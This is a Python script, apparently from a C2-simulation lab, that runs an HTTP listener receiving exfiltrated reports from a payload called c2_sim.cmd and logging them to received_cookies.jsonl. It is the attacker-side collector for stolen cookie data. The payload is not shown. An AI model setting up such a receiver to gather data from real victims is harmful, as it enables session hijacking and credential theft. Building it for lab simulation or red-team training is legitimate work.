#!/usr/bin/env python3
# kali_receiver.py - receiver for c2_sim.cmd exfil on the Kali/WSL box.
#
# Run this on the same host that c2_sim.cmd exfils to. The payload posts the
# full report to http://localhost:48732/c2 (Windows "localhost" forwards into
# WSL2 when localhostForwarding is enabled, which is the default). This script
# binds 0.0.0.0 so both localhost and the WSL IP work.
#
# Usage:
#   python3 kali_receiver.py                # listen on 0.0.0.0:48732
#   python3 kali_receiver.py --port 8080    # custom port
#
# Each POST body is printed to stdout AND appended (one JSON line) to
# received_cookies.jsonl in the current directory.

import argparse
import datetime
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LOG_FILE = "received_cookies.jsonl"


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send(self, code: int, body: bytes = b"ok"):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
        except (TypeError, ValueError):
            length = 0
        body = self.rfile.read(length) if length > 0 else b""

        ts = datetime.datetime.now(datetime.timezone.utc).strftime(
            "%Y-%m-%dT%H:%M:%SZ"
        )
        line = body.decode("utf-8", errors="replace")
        print("=" * 70)
        print(f"[{ts}] POST {self.path} from {self.client_address[0]}:{self.client_address[1]}")
        print(line)
        print("=" * 70, flush=True)

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line.rstrip("\n") + "\n")
        print(f"[*] appended to {LOG_FILE}", flush=True)

        self._send(200)

    def do_GET(self):
        self._send(200, b"kali_receiver alive\n")

    def log_message(self, fmt, *args):
        pass


def main():
    ap = argparse.ArgumentParser(description="c2_sim.cmd exfil receiver")
    ap.add_argument("--port", type=int, default=48732)
    args = ap.parse_args()

    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    print(f"[*] Listening on http://0.0.0.0:{args.port}/ - press Ctrl+C to stop.", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping.", flush=True)
    finally:
        server.server_close()


if __name__ == "__main__":
    sys.exit(main())
